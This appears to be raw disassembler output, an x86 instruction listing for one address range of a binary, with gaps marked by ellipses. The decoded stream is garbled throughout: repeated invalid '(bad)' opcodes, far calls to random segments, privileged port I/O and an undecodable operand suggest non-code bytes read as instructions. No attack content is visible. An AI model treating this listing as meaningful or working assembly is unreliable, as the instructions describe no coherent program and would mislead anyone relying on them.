  42f29f:	mov    ch,BYTE PTR [ebp-0x7c]
  42f2a2:	mov    eax,0x357ddebf
  42f2a7:	xchg   ebx,eax
  42f2a8:	es xchg ebx,eax
  42f2aa:	pop    edi
  42f2ab:	jge    0x42f2d1
  42f2ad:	popf   
  42f2ae:	(bad)  
  42f2af:	jnp    0x42f298
  42f2b1:	mov    ecx,0x18efae
	...
  42f316:	mov    ebp,0xaf8a081a
  42f31b:	call   0x6da4:0xb5dd3fbf
  42f322:	dec    edx
  42f323:	mov    dh,0xb3
  42f325:	cmp    dl,ah
  42f327:	stc    
  42f328:	add    DWORD PTR [eax],eax
  42f32a:	pop    es
  42f32b:	add    DWORD PTR [eax],eax
  42f32d:	add    BYTE PTR [esp],ch
  42f330:	imul   ebx,DWORD PTR [ebx+0x39],0xe2aef75e
  42f337:	xchg   edi,eax
  42f338:	fsub   QWORD PTR [ebp-0x326a4427]
  42f33e:	cmp    dh,dh
  42f340:	sbb    al,0xfa
  42f342:	addr16 addr16 mov bl,0x53
  42f346:	jne    0x42f390
  42f348:	push   edi
  42f349:	or     cl,BYTE PTR [ebp+0x22798360]
  42f34f:	test   al,0xdb
  42f351:	xchg   edi,eax
  42f352:	clc    
  42f353:	and    ebx,edx
  42f355:	jl     0x42f2f6
  42f357:	sahf   
  42f358:	pushf  
  42f359:	inc    esi
  42f35a:	sbb    DWORD PTR [edi+ebx*4+0x1fcc6a2e],edi
  42f361:	push   ds
  42f362:	shl    BYTE PTR [eax+0x3b],cl
  42f365:	mov    ebp,0xc40019a2
  42f36a:	rcr    DWORD PTR [edx-0x54],0x69
  42f36e:	rcl    BYTE PTR [esi],0x19
  42f371:	mov    ds:0x143abf73,al
  42f376:	test   BYTE PTR [eax],bl
  42f378:	or     BYTE PTR [esi+0x28],0x34
  42f37c:	add    ch,BYTE PTR [ebx+0x53a5f607]
  42f382:	and    BYTE PTR [ebp+0x46],0x7a
  42f386:	mov    bl,0x88
  42f388:	fnsave [edi]
  42f38a:	outs   dx,BYTE PTR ds:[esi]
  42f38b:	imul   esi,DWORD PTR [eax],0x42583cc6
  42f391:	in     al,dx
  42f392:	xor    eax,DWORD PTR [eax]
  42f394:	clc    
  42f395:	add    al,0xdf
  42f397:	cmp    ch,BYTE PTR ds:0x45941796
  42f39d:	dec    ecx
  42f39e:	in     al,0xcb
  42f3a0:	mov    ecx,0x1c71ff56
  42f3a5:	inc    edx
  42f3a6:	inc    ebp
  42f3a7:	pop    ecx
  42f3a8:	jmp    0x42f3c4
  42f3aa:	stos   DWORD PTR es:[edi],eax
  42f3ab:	push   ss
  42f3ac:	dec    ebx
  42f3ad:	aad    0x43
  42f3af:	xchg   ebp,eax
  42f3b0:	gs ret 
  42f3b2:	pop    ds
  42f3b3:	retf   
  42f3b4:	add    DWORD PTR [edi+0x41],0xffffffe7
  42f3b8:	sub    esi,esp
  42f3ba:	mov    bh,0x59
  42f3bc:	(bad)
  42f3c1:	nop
  42f3c2:	fidivr DWORD PTR [eax+0x64]
  42f3c5:	mov    ds:0x6e01c410,al
  42f3ca:	hlt    
  42f3cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f3cc:	or     eax,0xc343cc83
  42f3d1:	call   0x12f17a89
  42f3d6:	add    esi,DWORD PTR [eax+0x62]
  42f3d9:	mov    ebp,0x2e6e7975
  42f3de:	dec    ebp
  42f3df:	imul   ebx,DWORD PTR [esi+eax*1+0x55],0xfffffff0
  42f3e4:	call   0x633b9dd8
  42f3e9:	stos   BYTE PTR es:[edi],al
  42f3ea:	sbb    eax,DWORD PTR [eax-0x22]
  42f3ed:	jmp    0x42f441
  42f3ef:	lods   eax,DWORD PTR ds:[esi]
  42f3f0:	retf   
  42f3f1:	dec    ecx
  42f3f2:	jle    0x42f380
  42f3f4:	shl    DWORD PTR [esi],1
  42f3f6:	and    al,0xa5
  42f3f8:	inc    eax
  42f3f9:	pusha  
  42f3fa:	test   al,0xc0
  42f3fc:	idiv   bh
  42f3fe:	loopne 0x42f444
  42f400:	mov    ebx,0x95575414
  42f405:	sub    ecx,edi
  42f407:	cmp    edi,0xc13e6465
  42f40d:	xchg   edi,eax
  42f40e:	int    0xf8
  42f410:	adc    al,0xc5
  42f412:	lods   eax,DWORD PTR ds:[esi]
  42f413:	repnz scas al,BYTE PTR es:[edi]
  42f415:	mov    ecx,0xc9116404
  42f41a:	ror    ah,cl
  42f41c:	push   ecx
  42f41d:	call   0xb970:0xc9fca7d8
  42f424:	shl    BYTE PTR [ecx],cl
  42f426:	push   0xffffffcd
  42f428:	mov    cl,0x30
  42f42a:	(bad)  
  42f42b:	sti    
  42f42c:	loopne 0x42f4ac
  42f42e:	lea    ecx,[edx-0x9]
  42f431:	push   eax
  42f432:	iret   
  42f433:	xor    ebp,DWORD PTR [ebx]
	...
  42f495:	add    BYTE PTR [edi],dh
  42f497:	jae    0x42f4e3
  42f499:	cdq    
  42f49a:	dec    esi
  42f49b:	mov    ecx,0x1986fff7
  42f4a0:	jge    0x42f502
  42f4a2:	aam    0xfc
  42f4a4:	hlt    
  42f4a5:	pop    ds
  42f4a6:	jmp    0x742f6a5
  42f4ab:	add    DWORD PTR [eax],eax
  42f4ad:	add    BYTE PTR [esi-0x16],bh
  42f4b0:	mov    al,0xe3
  42f4b2:	jmp    0xd0a796e3
  42f4b7:	mov    cl,0x4b
  42f4b9:	aam    0x9b
  42f4bb:	or     DWORD PTR [eax+0x6],0x1f
  42f4bf:	push   ss
  42f4c0:	sub    DWORD PTR [ebp-0x10d44067],eax
  42f4c6:	and    BYTE PTR [ecx+0x65],0xaf
  42f4ca:	xor    bl,dl
  42f4cc:	sbb    edx,eax
  42f4ce:	call   FWORD PTR [esi]
  42f4d0:	(bad)  
  42f4d2:	push   0x4d6e679e
  42f4d7:	into   
  42f4d8:	iret   
  42f4d9:	lock shl DWORD PTR [edx],1
  42f4dc:	stos   BYTE PTR es:[edi],al
  42f4dd:	adc    al,0x78
  42f4df:	test   BYTE PTR [ebp-0x21b06da3],bh
  42f4e5:	pop    DWORD PTR [eax]
  42f4e7:	scas   al,BYTE PTR es:[edi]
  42f4e8:	ins    DWORD PTR es:[edi],dx
  42f4e9:	push   edx
  42f4ea:	cmp    al,0xcf
  42f4ec:	nop
  42f4ed:	mov    eax,ds:0x86105f2c
  42f4f2:	xor    BYTE PTR [ecx+eiz*8-0x69],dh
  42f4f6:	adc    ebx,eax
  42f4f8:	cdq    
  42f4f9:	adc    eax,DWORD PTR [ecx]
  42f4fb:	mov    bl,0xcf
  42f4fd:	adc    BYTE PTR [ecx+0x42],dh
  42f500:	in     al,dx
  42f501:	inc    ebp
  42f502:	and    al,0xaf
  42f504:	sbb    eax,0x433d1940
  42f509:	retf   0xe7d3
  42f50c:	pop    es
  42f50d:	sub    dl,BYTE PTR [bp+si+0x257b]
  42f512:	dec    edx
  42f513:	out    dx,al
  42f514:	add    al,0xb
  42f516:	add    al,0x8c
  42f518:	xchg   edx,eax
  42f519:	fucom  st(3)
  42f51b:	cmc    
  42f51c:	inc    edx
  42f51d:	dec    ebx
  42f51e:	stos   BYTE PTR es:[edi],al
  42f51f:	popa   
  42f520:	pop    DWORD PTR [ecx]
  42f522:	mov    eax,DWORD PTR [ebp+0x6b]
  42f525:	shr    bl,cl
  42f527:	adc    BYTE PTR [ebx],0xd5
  42f52a:	lods   al,BYTE PTR ds:[esi]
  42f52b:	mov    bh,0xa5
  42f52d:	dec    ebp
  42f52e:	fstp   DWORD PTR [edx+edi*1-0x70f6afb8]
  42f535:	jae    0x42f4c7
  42f537:	fmul   QWORD PTR [eax]
  42f539:	sbb    eax,0x8e3381e5
  42f53e:	inc    eax
  42f53f:	add    eax,0x763a199c
  42f544:	xchg   edx,eax
  42f545:	je     0x42f5ac
  42f547:	xchg   edx,eax
  42f548:	mov    al,0xee
  42f54a:	xor    al,BYTE PTR ss:[edi]
  42f54d:	into   
  42f54e:	push   es
  42f54f:	push   0x4d9a6ed2
  42f554:	fcom   DWORD PTR [esi+0x55c5ea0a]
  42f55a:	xchg   ebp,ecx
  42f55c:	leave  
  42f55d:	add    bl,BYTE PTR [eax+0x68]
  42f560:	or     al,0x6f
  42f562:	test   DWORD PTR [ecx+0x58],ebx
  42f565:	add    eax,DWORD PTR [ebx+0x1a4760c1]
  42f56b:	out    dx,eax
  42f56c:	sbb    DWORD PTR [esi+0x2c4784c8],edi
  42f572:	sub    DWORD PTR [edi],esp
  42f574:	(bad)  
  42f575:	(bad)  
  42f576:	mov    ds:0x2da49564,eax
  42f57b:	jae    0x42f5eb
  42f57d:	push   0xffffffd5
  42f57f:	mov    esi,0x3d9f2cf5
  42f584:	mov    dh,dl
  42f586:	mov    al,0x7c
  42f588:	push   0x17c32be3
  42f58d:	and    eax,0x5a5e0251
  42f592:	and    esi,DWORD PTR [eax+eax*1]
  42f595:	dec    ecx
  42f596:	cdq    
  42f597:	or     eax,0xb91210ae
  42f59c:	dec    ebx
  42f59d:	mov    esi,0xe8560005
  42f5a2:	inc    edi
  42f5a3:	ins    DWORD PTR es:[edi],dx
  42f5a4:	and    ax,0x88b0
  42f5a8:	sahf   
  42f5a9:	mov    dl,0xf0
  42f5ab:	mov    ds:0xcf60f960,eax
  42f5b0:	dec    edi
  42f5b1:	add    DWORD PTR [edx],edx
  42f5b3:	cmp    edi,ecx
	...
  42f615:	add    BYTE PTR [esi],bh
  42f617:	push   esi
  42f618:	into   
  42f619:	nop
  42f61a:	out    dx,al
  42f61b:	cwde   
  42f61c:	jle    0x42f61c
  42f61e:	pop    edx
  42f61f:	or     bh,BYTE PTR [ebx+edx*2+0x5]
  42f623:	sub    edx,0x4c
  42f626:	lock sti 
  42f628:	add    DWORD PTR [eax],eax
  42f62a:	pop    es
  42f62b:	add    DWORD PTR [eax],eax
  42f62d:	add    BYTE PTR [esi],al
  42f62f:	scas   al,BYTE PTR es:[edi]
  42f630:	retf   0xa2cc
  42f633:	push   eax
  42f634:	les    eax,FWORD PTR [edx+0x2f45ba37]
  42f63a:	mov    edi,0x7c1435ca
  42f63f:	in     eax,dx
  42f640:	add    DWORD PTR [edx+0x50],0x48
  42f644:	add    eax,0xecce0ccd
  42f649:	fmul   st(0),st
  42f64b:	xchg   ebp,eax
  42f64c:	and    ah,BYTE PTR [ecx]
  42f64e:	xchg   BYTE PTR [esp+0x2d],dh
  42f652:	fcmove st,st(4)
  42f654:	in     al,dx
  42f655:	mov    ss,WORD PTR [esp+ebp*4+0x27]
  42f659:	pop    edi
  42f65a:	cld    
  42f65b:	add    esi,0x62
  42f65e:	push   cs
  42f65f:	lods   al,BYTE PTR ds:[esi]
  42f660:	sbb    esp,DWORD PTR [ecx]
  42f662:	(bad)  [eax]
  42f664:	fidiv  WORD PTR [eax]
  42f666:	adc    dh,ch
  42f668:	pushf  
  42f669:	cmc    
  42f66a:	inc    edi
  42f66b:	and    eax,0x138611d4
  42f670:	rol    DWORD PTR [ecx],cl
  42f672:	xchg   esi,eax
  42f673:	mov    ds,WORD PTR [ecx-0x6dd343bb]
  42f679:	push   ebp
  42f67a:	mov    dh,0x8a
  42f67c:	adc    eax,DWORD PTR [ebx+0x7ba8d1f7]
  42f682:	imul   ecx,DWORD PTR [esp+ebp*1+0x28b3b77a],0xffffffb2
  42f68a:	pop    es
  42f68b:	mov    edx,0xe4ecae89
  42f690:	and    ebp,DWORD PTR [ebp-0x79]
  42f693:	sub    bl,BYTE PTR [ebx]
  42f695:	retf   
  42f696:	xor    eax,0xd251e40b
  42f69b:	call   FWORD PTR [esi-0x43]
  42f69e:	fld    TBYTE PTR [eax]
  42f6a0:	push   es
  42f6a1:	out    dx,al
  42f6a2:	sahf   
  42f6a3:	mov    bh,0x8e
  42f6a5:	sbb    DWORD PTR [ebx-0x6af377f2],ebp
  42f6ab:	daa    
  42f6ac:	pop    edx
  42f6ad:	mov    dh,0x80
  42f6af:	jp     0x42f6e7
  42f6b1:	sbb    esp,DWORD PTR [ecx-0x30a8d5fe]
  42f6b7:	sub    cl,BYTE PTR [ebx]
  42f6b9:	aas    
  42f6ba:	std    
  42f6bb:	fcmovnu st,st(0)
  42f6bd:	dec    esp
  42f6be:	fdiv   QWORD PTR [esi+0x7a0c02d4]
  42f6c4:	iret   
  42f6c5:	rol    bl,0x52
  42f6c8:	sbb    BYTE PTR [esi+eax*1-0x62069f78],0xb5
  42f6d0:	(bad)  
  42f6d1:	jg     0x42f714
  42f6d3:	std    
  42f6d4:	jb     0x42f710
  42f6d6:	and    al,bh
  42f6d8:	mov    ah,0x99
  42f6da:	pop    ds
  42f6db:	test   bh,ch
  42f6dd:	add    BYTE PTR gs:[ecx-0x9],ah
  42f6e1:	dec    esp
  42f6e2:	inc    ebx
  42f6e3:	xchg   esp,eax
  42f6e4:	add    DWORD PTR [ebp+0x47],ebp
  42f6e7:	sbb    BYTE PTR [ebp-0x3d],dh
  42f6ea:	cs push esp
  42f6ec:	sub    BYTE PTR [edx-0x6a],cl
  42f6ef:	jge    0x42f6d5
  42f6f1:	mov    ebx,0x9c01cb29
  42f6f6:	mov    dl,0x96
  42f6f8:	mov    ss,WORD PTR [ecx+0x130784d9]
  42f6fe:	dec    edx
  42f6ff:	pop    edi
  42f700:	stc    
  42f701:	inc    edx
  42f702:	cdq    
  42f703:	cmp    DWORD PTR [eax+0x2e2a8c1e],esp
  42f709:	or     eax,0xe1c92478
  42f70e:	sub    al,0x3d
  42f710:	call   0x1062:0x688e04f0
  42f717:	aad    0x1
  42f719:	and    al,0xb7
  42f71b:	xor    al,0x33
  42f71d:	cmp    eax,0xe746f45a
  42f722:	mov    ebp,DWORD PTR [eax+0x6f]
  42f725:	into   
  42f726:	sub    al,0xde
  42f728:	xchg   ecx,eax
  42f729:	test   DWORD PTR [ecx-0x7b],edx
  42f72c:	retf   0xf981
  42f72f:	sti    
  42f730:	out    0x18,al
  42f732:	and    bh,BYTE PTR [edx-0x1f]
	...
  42f795:	add    BYTE PTR [ecx-0x5f],dh
  42f798:	(bad)  
  42f799:	test   al,0xd6
  42f79b:	(bad)  
  42f79c:	jg     0x42f797
  42f79e:	in     al,0x8a
  42f7a0:	jmp    0x42f76f
  42f7a2:	xchg   ebx,eax
  42f7a3:	mov    ebp,0xfcf7fc18
  42f7a8:	add    DWORD PTR [eax],eax
  42f7aa:	pop    es
  42f7ab:	add    DWORD PTR [eax],eax
  42f7ad:	add    BYTE PTR [esi],bl
  42f7af:	pop    ebp
  42f7b0:	mov    ecx,0x47a6ca37
  42f7b5:	jmp    0x42f7e3
  42f7b7:	sub    BYTE PTR [edx+0x1bb27777],ch
  42f7bd:	dec    eax
  42f7be:	mov    esp,0x3a7ebac1
  42f7c3:	jmp    DWORD PTR [ecx-0x58]
  42f7c6:	pop    es
  42f7c7:	lock ja 0x42f74c
  42f7ca:	push   ebx
  42f7cb:	scas   al,BYTE PTR es:[edi]
  42f7cc:	jne    0x42f832
  42f7ce:	pushf  
  42f7cf:	xchg   DWORD PTR ds:0xa267694c,ebp
  42f7d5:	repnz dec ebx
  42f7d7:	mov    ebp,0xce042456
  42f7dc:	mov    cl,0x61
  42f7de:	pop    ss
  42f7df:	sti    
  42f7e0:	scas   al,BYTE PTR es:[edi]
  42f7e1:	pop    ss
  42f7e2:	imul   edi,DWORD PTR [esi],0xffffff8a
  42f7e5:	xchg   edx,esp
  42f7e7:	mov    ss,WORD PTR [ebx+0x2e]
  42f7ea:	leave  
  42f7eb:	retf   0xe28d
  42f7ee:	add    bl,BYTE PTR [eax]
  42f7f0:	daa    
  42f7f1:	(bad)  
  42f7f2:	jb     0x42f803
  42f7f4:	and    BYTE PTR [ecx+ecx*8],dh
  42f7f7:	test   al,0x48
  42f7f9:	inc    ecx
  42f7fa:	call   0xb34d45d
  42f7ff:	push   ds
  42f800:	mov    al,0x1b
  42f802:	fcmovbe st,st(7)
  42f804:	mov    esi,0x2b0d6134
  42f809:	rcr    DWORD PTR [edi],cl
  42f80b:	sbb    eax,0xfe7c6c7b
  42f810:	test   BYTE PTR [edx-0x59],dl
  42f813:	xchg   ecx,eax
  42f814:	pop    edx
  42f815:	mov    al,ds:0xb75c0957
  42f81a:	sbb    eax,0xd4a8e28d
  42f81f:	xchg   edx,eax
  42f820:	and    DWORD PTR [ecx+0x6f],eax
  42f823:	mov    dl,0xa5
  42f825:	xchg   edx,eax
  42f826:	fmulp  st(6),st
  42f828:	jnp    0x42f830
  42f82a:	xchg   ebx,eax
  42f82b:	pop    ebx
  42f82c:	push   ebp
  42f82d:	lds    ebp,FWORD PTR [eax+0x2d]
  42f830:	loop   0x42f7d6
  42f832:	inc    edx
  42f833:	sbb    cl,al
  42f835:	fld    DWORD PTR [ecx]
  42f837:	test   eax,0x5df5b5fc
  42f83c:	(bad)  
  42f83d:	cmp    bl,BYTE PTR [esi]
  42f83f:	mov    BYTE PTR [edx+0x5d],ah
  42f842:	(bad)  
  42f843:	dec    esp
  42f844:	clc    
  42f845:	dec    eax
  42f846:	mov    eax,0x91bc9d71
  42f84b:	test   BYTE PTR [edi-0x114d31b7],bh
  42f851:	jno    0x42f8a9
  42f853:	dec    esp
  42f854:	js     0x42f892
  42f856:	les    eax,FWORD PTR [ebx-0x7c]
  42f859:	ds pusha 
  42f85b:	pop    ds
  42f85c:	ins    BYTE PTR es:[edi],dx
  42f85d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f85e:	js     0x42f7e4
  42f860:	mov    ebp,0x65fb9b94
  42f865:	aam    0x39
  42f867:	in     eax,0x37
  42f869:	scas   al,BYTE PTR es:[edi]
  42f86a:	push   ss
  42f86b:	retf   0x4e7
  42f86e:	and    ah,dl
  42f870:	sbb    esi,esp
  42f872:	add    dh,BYTE PTR [eax-0x73]
  42f875:	jp     0x42f7f8
  42f877:	dec    ebx
  42f878:	adc    eax,DWORD PTR [ebp-0x7a]
  42f87b:	call   0x5af7374d
  42f880:	dec    edi
  42f881:	inc    ecx
  42f882:	jecxz  0x42f903
  42f884:	ss (bad) 
  42f886:	fidivr DWORD PTR [edx+0x1a]
  42f889:	in     al,dx
  42f88a:	pop    esi
  42f88b:	mov    ds:0x9965bef2,eax
  42f890:	inc    ecx
  42f891:	xchg   edi,eax
  42f892:	cld    
  42f893:	call   0xf3b9f87d
  42f898:	pop    edx
  42f899:	inc    edi
  42f89a:	(bad)  
  42f89b:	enter  0xa302,0xd6
  42f89f:	lea    eax,[ecx-0x2d57cedd]
  42f8a5:	jl     0x42f892
  42f8a7:	push   esp
  42f8a8:	dec    esp
  42f8a9:	pop    ss
  42f8aa:	xchg   edi,eax
  42f8ab:	xor    al,0xcf
  42f8ad:	cld    
  42f8ae:	push   esp
  42f8af:	inc    edi
  42f8b0:	aam    0xee
  42f8b2:	pop    ebp
  42f8b3:	mov    edi,0xb4
	...
  42f914:	add    BYTE PTR [eax],al
  42f916:	adc    al,0x74
  42f918:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f919:	push   ebp
  42f91a:	in     al,0xd5
  42f91c:	cmc    
  42f91d:	jne    0x42f8e0
  42f91f:	ror    DWORD PTR [ecx-0x7e699f64],1
  42f925:	mov    bh,dh
  42f927:	std    
  42f928:	add    DWORD PTR [eax],eax
  42f92a:	pop    es
  42f92b:	add    DWORD PTR [eax],eax
  42f92d:	add    BYTE PTR [edi+ebp*2+0x7c],al
  42f931:	xor    ebx,esp
  42f933:	pop    ebx
  42f934:	jne    0x42f8d9
  42f936:	add    ebx,0x7e157072
  42f93c:	jl     0x42f955
  42f93e:	popf   
  42f93f:	pop    esp
  42f940:	ss or  eax,0x2c6c0f0e
  42f946:	pop    ebx
  42f947:	and    al,0xf2
  42f949:	jmp    0x3b6c:0x137a073c
  42f950:	out    dx,al
  42f951:	jo     0x42f919
  42f953:	(bad)  
  42f954:	sbb    bh,al
  42f956:	cli    
  42f957:	mov    edx,0xf4ec87dc
  42f95c:	mov    ds:0x775840fe,eax
  42f961:	mov    ds:0x80bf2ad8,al
  42f966:	sbb    DWORD PTR [edi],ebp
  42f968:	loopne 0x42f9b8
  42f96a:	or     eax,0xcc472c93
  42f96f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f970:	push   ss
  42f971:	xor    al,0x72
  42f973:	int3   
  42f974:	mov    edi,0xb65d9641
  42f979:	xor    BYTE PTR [edi+ebx*2-0x3d],bl
  42f97d:	(bad)  
  42f97e:	inc    ebp
  42f97f:	sbb    BYTE PTR [edx],ch
  42f981:	daa    
  42f982:	ds add al,0x38
  42f985:	adc    DWORD PTR ds:0xb6038d24,edx
  42f98b:	add    al,BYTE PTR [ebp-0x662d6cf5]
  42f991:	pop    ebp
  42f992:	dec    ebp
  42f993:	mov    ecx,0x9492e3ff
  42f998:	call   0xb6a6:0x761b6611
  42f99f:	or     al,0x87
  42f9a1:	dec    esi
  42f9a2:	shr    BYTE PTR [edx],0xf0
  42f9a5:	scas   eax,DWORD PTR es:[edi]
  42f9a6:	mov    edx,0xc782f5ae
  42f9ab:	ds push edx
  42f9ad:	xor    dl,BYTE PTR [edx-0x20]
  42f9b0:	jnp    0x42fa02
  42f9b2:	retf   
  42f9b3:	ror    BYTE PTR [esi+0x40],0xeb
  42f9b7:	cmp    al,0xf9
  42f9b9:	repnz mov al,ds:0xc99b0a3
  42f9bf:	adc    dl,BYTE PTR [esi]
  42f9c1:	enter  0xb900,0x1a
  42f9c5:	cmp    eax,0xfaf5ca08
  42f9ca:	and    DWORD PTR [edx+0x131b8d51],edi
  42f9d0:	mov    ecx,0xe4f8266d
  42f9d5:	lea    esp,[eax+0x5e]
  42f9d8:	cs mov dh,0x6a
  42f9db:	xchg   edi,eax
  42f9dc:	(bad)  
  42f9dd:	pop    esi
  42f9de:	fs pop ebx
  42f9e0:	fistp  DWORD PTR [edi+0xae5f581]
  42f9e6:	stc    
  42f9e7:	sub    ebx,ecx
  42f9e9:	inc    ebx
  42f9ea:	fnstsw WORD PTR [ebp-0x6ce478f1]
  42f9f0:	out    0x5a,eax
  42f9f2:	jbe    0x42fa02
  42f9f4:	(bad)  
  42f9f6:	inc    esp
  42f9f7:	inc    ebp
  42f9f8:	sbb    eax,0x879c9843
  42f9fd:	ret    0x687f
  42fa00:	sub    ebp,DWORD PTR [ebp-0x49ffc1c8]
  42fa06:	or     dh,ah
  42fa08:	fwait
  42fa09:	or     BYTE PTR [esi],ch
  42fa0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fa0c:	fnsave [ebx+0x3d3aa2c9]
  42fa12:	repz leave 
  42fa14:	repnz repz or BYTE PTR [ecx-0x3d4eb707],0x2f
  42fa1d:	icebp  
  42fa1e:	dec    edi
  42fa1f:	icebp  
  42fa20:	mov    ds:0x7017b81,al
  42fa25:	int    0x64
  42fa27:	ss imul esi,ebp,0x3666901c
  42fa2e:	push   cs
  42fa2f:	xor    edx,ecx
  42fa31:	int3   
  42fa32:	outs   dx,BYTE PTR ds:[esi]
  42fa33:	(bad)  
	...
  42fa95:	add    BYTE PTR [ebx],bl
  42fa97:	out    dx,eax
  42fa98:	shl    BYTE PTR [esi],0xf4
  42fa9b:	aas    
  42fa9c:	(bad)  
  42fa9d:	out    dx,eax
  42fa9e:	sbb    dl,BYTE PTR [esi+eiz*8-0x1c]
  42faa2:	(bad)  
  42faa4:	ds sbb eax,0x1ff05
  42faaa:	pop    es
  42faab:	add    DWORD PTR [eax],eax
  42faad:	add    BYTE PTR [eax+0x68],ah
  42fab0:	jp     0x42fb28
  42fab2:	mov    dh,0x25
  42fab4:	pop    esi
  42fab5:	add    DWORD PTR [ecx+0x6d93b809],ebp
  42fabb:	ss addr16 jge 0x42fac5
  42fabf:	and    ch,BYTE PTR [ecx+0x40]
  42fac2:	ror    BYTE PTR [ecx-0x22],0x8f
  42fac6:	js     0x42fabd
  42fac8:	in     eax,dx
  42fac9:	loop   0x42fb45
  42facb:	pop    eax
  42facc:	std    
  42facd:	sbb    eax,0x429e3daa
  42fad2:	test   BYTE PTR [eax+0x60],dh
  42fad5:	sbb    al,0xcd
  42fad7:	sub    edi,0x538dd3fd
  42fadd:	inc    esp
  42fade:	pop    ebp
  42fadf:	dec    eax
  42fae0:	ss inc edi
  42fae2:	jle    0x42fab3
  42fae4:	adc    DWORD PTR [esi+0x2d],ecx
  42fae7:	mov    ebx,0x7a74eaa
  42faec:	mov    ?,WORD PTR [eax-0x6af42caa]
  42faf2:	jne    0x42faa2
  42faf4:	lods   al,BYTE PTR ds:[esi]
  42faf5:	adc    DWORD PTR [esi-0x28],esi
  42faf8:	and    ah,BYTE PTR [ecx+0x7c6f3e36]
  42fafe:	dec    esi
  42faff:	aam    0x1f
  42fb01:	nop
  42fb02:	outs   dx,DWORD PTR ds:[esi]
  42fb03:	lods   al,BYTE PTR gs:[esi]
  42fb05:	mov    bl,0xac
  42fb07:	rcl    DWORD PTR [ebp-0x7626f6e2],cl
  42fb0d:	shr    BYTE PTR [edx+0x341df092],cl
  42fb13:	daa    
  42fb14:	imul   ebx,DWORD PTR [eax+0x616dcc40],0xffffffdc
  42fb1b:	mov    edx,0xa59f3e09
  42fb20:	(bad)  
  42fb22:	mov    BYTE PTR [edi+0x15],dh
  42fb25:	adc    esp,esp
  42fb27:	push   ds
  42fb28:	retf   
  42fb29:	adc    al,0xa6
  42fb2b:	gs add eax,0x2418113c
  42fb31:	xchg   DWORD PTR [eax+ebx*2],eax
  42fb34:	cmp    DWORD PTR [ebx-0x59],ebx
  42fb37:	xchg   edi,eax
  42fb38:	mov    esi,0xae09a4d1
  42fb3d:	push   0x24
  42fb3f:	out    0x43,eax
  42fb41:	arpl   WORD PTR [ebx],ax
  42fb43:	mov    ah,0x6c
  42fb45:	and    ah,0xd5
  42fb48:	sbb    eax,0xb18d9ca
  42fb4d:	scas   al,BYTE PTR es:[edi]
  42fb4e:	jb     0x42fba9
  42fb50:	lods   eax,DWORD PTR ds:[esi]
  42fb51:	push   esi
  42fb52:	add    cl,BYTE PTR [ebp+0x1d805865]
  42fb58:	cmp    al,0x8e
  42fb5a:	mov    edi,0x2c859199
  42fb5f:	add    bl,BYTE PTR [esi+eax*4+0x38]
  42fb63:	pop    esp
  42fb64:	ja     0x42fb0c
  42fb66:	cmp    edx,eax
  42fb68:	(bad)  [eax+0x47]
  42fb6b:	push   ss
  42fb6c:	push   edx
  42fb6d:	in     al,dx
  42fb6e:	test   BYTE PTR [ebx],dh
  42fb70:	cmp    al,0xd
  42fb72:	cmp    eax,0x745efe16
  42fb77:	add    cl,BYTE PTR [ecx-0x11]
  42fb7a:	enter  0x54d,0x3d
  42fb7e:	idiv   DWORD PTR [esi+0x1b30e686]
  42fb84:	hlt    
  42fb85:	sub    BYTE PTR [ebp+0x1d],ah
  42fb88:	mul    DWORD PTR [edi+0x4f]
  42fb8b:	into   
  42fb8c:	mov    WORD PTR [ecx],gs
  42fb8e:	push   ss
  42fb8f:	or     dl,bh
  42fb91:	inc    edx
  42fb92:	cmp    ah,ah
  42fb94:	or     BYTE PTR [eax+0x7a],dl
  42fb97:	jp     0x42fbd8
  42fb99:	sub    ch,BYTE PTR ds:0xf8eec232
  42fb9f:	ret    0x9ef2
  42fba2:	dec    ebx
  42fba3:	sub    al,0xa2
  42fba5:	or     BYTE PTR [edi+esi*8],dh
  42fba8:	jle    0x42fb2d
  42fbaa:	jno    0x42fb3b
  42fbac:	fisubr DWORD PTR [ebx-0x58]
  42fbaf:	or     al,BYTE PTR [eax+0x34]
  42fbb2:	dec    esp
  42fbb3:	cmp    al,0x85
	...
  42fc15:	add    BYTE PTR [ebx],cl
  42fc17:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  42fc1d:	call   0xe848:0x9e5607ea
  42fc24:	gs push ss
  42fc26:	or     al,0x0
  42fc28:	add    al,BYTE PTR [eax]
  42fc2a:	pop    es
  42fc2b:	add    DWORD PTR [eax],eax
  42fc2d:	add    BYTE PTR [eax],ch
  42fc2f:	dec    ebp
  42fc30:	mov    dl,0x62
  42fc32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fc33:	arpl   WORD PTR [esi],cx
  42fc35:	xchg   ebx,eax
  42fc36:	add    dl,cl
  42fc38:	add    eax,DWORD PTR [ebx+ebp*2+0x14]
  42fc3c:	stos   BYTE PTR es:[edi],al
  42fc3d:	das    
  42fc3e:	push   cs
  42fc3f:	es mov bl,0x65
  42fc42:	add    BYTE PTR [edx],al
  42fc44:	and    ch,BYTE PTR [ebx+edi*1-0x25d2d230]
  42fc4b:	cmp    ah,cl
  42fc4d:	loope  0x42fcaf
  42fc4f:	pop    esi
  42fc50:	push   ebx
  42fc51:	and    dl,bl
  42fc53:	dec    edx
  42fc54:	add    al,0xed
  42fc56:	in     eax,dx
  42fc57:	mov    ah,0xbc
  42fc59:	dec    esi
  42fc5a:	mov    edi,0x7e89b104
  42fc5f:	aaa    
  42fc60:	xchg   ecx,eax
  42fc61:	fld    TBYTE PTR [esi]
  42fc63:	call   0xa060:0xb60a04c8
  42fc6a:	mov    ds:0xf6b6e0bc,eax
  42fc6f:	cli    
  42fc70:	add    eax,0x1223c589
  42fc75:	mov    bh,0xe6
  42fc77:	gs gs dec esp
  42fc7a:	jg     0x42fce4
  42fc7c:	cmp    DWORD PTR [ebp+0x3a],0xffffffe7
  42fc80:	adc    al,0x2b
  42fc82:	pop    es
  42fc83:	or     ch,dh
  42fc85:	dec    ebp
  42fc87:	mov    bh,0x3f
  42fc89:	popa   
  42fc8a:	push   ds
  42fc8b:	and    ebx,DWORD PTR [ebp-0x6d01245e]
  42fc91:	mov    cl,BYTE PTR [eax-0x6ffae0d]
  42fc97:	cmp    BYTE PTR [ebp+eiz*1-0x2f],dl
  42fc9b:	into   
  42fc9c:	in     eax,0xac
